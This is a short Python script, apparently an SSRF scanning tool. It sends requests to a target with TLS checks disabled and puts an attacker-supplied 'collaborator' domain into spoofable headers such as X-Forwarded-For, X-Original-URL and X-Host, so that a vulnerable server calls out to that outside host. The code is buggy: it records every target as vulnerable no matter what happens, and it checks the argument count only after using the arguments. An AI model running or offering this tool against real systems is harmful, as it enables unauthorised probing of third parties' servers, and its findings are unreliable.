import requests
import sys
import string
import random
import logging
logging.basicConfig(level=logging.DEBUG)
from requests.packages import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

S = 10
list = ["X-Custom-IP-Authorization", "X-Custom-IP-Authorization", "X-Original-URL", "X-Rewrite-URL", "X-Originating-IP", "X-Forwarded-For", "X-Remote-IP", "X-Client-IP", "X-Host", "X-Forwarded-Host", "Referrer"]
def main():
    target = sys.argv[1]
    ssrf_baby = sys.argv[2]
    endpoint = sys.argv[3]
    if len(sys.argv) >= 3:
        try:
            makeup = target+endpoint
            collaborator = ssrf_baby
            ran = ''.join(random.choices(string.ascii_uppercase + string.digits, k = S))
            collab = str(ran)+'.'+collaborator
            for headerz in list:
                target_headers = {headerz: collab}
                r = requests.get(makeup, headers=target_headers, timeout=None, verify=False)
                with open("vulnerable.txt", "w") as f:
                    f.write(target)
                    f.close
        except Exception as error:
            print ("something went wrong")
if __name__ == '__main__':
    main()
